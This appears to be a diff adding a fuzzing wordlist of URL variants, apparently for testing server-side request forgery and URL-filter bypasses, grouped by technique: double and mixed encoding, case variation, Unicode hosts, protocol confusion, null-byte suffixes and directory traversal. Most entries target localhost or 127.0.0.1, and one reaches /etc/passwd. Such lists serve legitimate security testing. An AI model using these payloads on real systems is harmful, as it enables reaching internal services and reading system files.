@@ -1,0 +1,73 @@
+# Double URL Encoding
+http%253A%252F%252F
+https%253A%252F%252F
+
+# Mixed Encoding
+http%3A%2F%2F
+htTp%3a%2f%2f
+
+# Case Variation
+hTTp://
+HttpS://
+HtTp://
+hTTpS://
+httP://
+HTTP://
+HTTPS://
+hTtPs://
+
+# Unicode Encoding
+http://例子.测试
+http://xn--fsqu00a.xn--0zwm56d
+http:/%2f%2f
+http:\\
+http://％Ｅ４％ＢＢ％Ａ３％Ｅ６％Ｂ５％８Ｂ
+http://例え.テスト
+http://мойдомен.рф
+http://测试.测试
+http://مثال.إختبار
+
+# Special Characters
+http://.../
+http://...\\
+http:////
+http://%2e%2e/
+http://%2e%2e\\
+http://%2f%2f/
+http://%2e/
+http://%2f/
+http://%252e/
+http://%252f/
+http://%2e%2e%2f/
+http://%2e%2e%5c/
+http://%2f%2f%2f/
+
+# Protocol Confusion
+http:http://
+http:https://
+https:http://
+http:////127.0.0.1
+http:////localhost
+http:/127.0.0.1
+http:/localhost
+http:\\127.0.0.1
+http:\\localhost
+http:////[::1]
+
+# Null Byte
+http://127.0.0.1%00
+http://127.0.0.1%0d%0a
+http://127.0.0.1%09
+http://127.0.0.1%20
+http://127.0.0.1%0a
+
+# Directory Traversal
+http://../../
+http://../../../
+http://127.0.0.1/../../../../../../../../../../etc/passwd
+http://127.0.0.1/..%2f..%2f..%2f..%2f
+http://127.0.0.1/..\\..\\..\\..\\
+http://127.0.0.1/%2e%2e/%2e%2e/%2e%2e/
+http://127.0.0.1/%252e%252e/%252e%252e/
+http://127.0.0.1/%2e%2e%2f%2e%2e%2f
+http://127.0.0.1/%2e%2e%5c%2e%2e%5c
